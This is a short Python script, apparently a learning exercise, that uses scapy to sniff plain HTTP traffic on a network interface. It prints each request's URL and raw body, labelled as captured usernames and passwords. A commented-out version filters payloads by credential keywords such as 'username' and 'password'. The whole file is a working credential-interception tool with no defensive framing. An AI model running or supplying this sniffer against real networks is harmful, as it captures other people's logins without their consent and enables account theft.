#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import argparse

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=sort_packet)

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("interface", help="Specify the network interface to sniff on.")
    args = parser.parse_args()
    return args.interface 
    
#def sort_packet(packet):
#    if packet.haslayer(http.HTTPRequest):
#        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
#        print("[+]HTTP Rrquest >>", url)
#        if packet.haslayer(scapy.Raw):
#            load = packet[scapy.Raw].load
#            keywords = ["username", "uname", "login", "password", "pass", "pword"]
#            for keyword in keywords:
#                if keyword in load:
#                    print("\n\n Tried getting usernames and passwords ", load)
#                    break
                    
           
            
def sort_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path
        print(f"Type of packet[http.HTTPRequest].Host: {type(host)}")
        print(f"Type of packet[http.HTTPRequest].Path: {type(path)}")
        url = host.decode() + path.decode()
        print("[+] HTTP Request >>", url)
        if packet.haslayer(scapy.Raw):
            raw_load = packet[scapy.Raw].load
            print(f"Type of packet[scapy.Raw].load: {type(raw_load)}")
            print("\n\n Tried getting usernames and passwords", raw_load.decode(errors='ignore'))
interface = get_interface()
sniffer(interface)
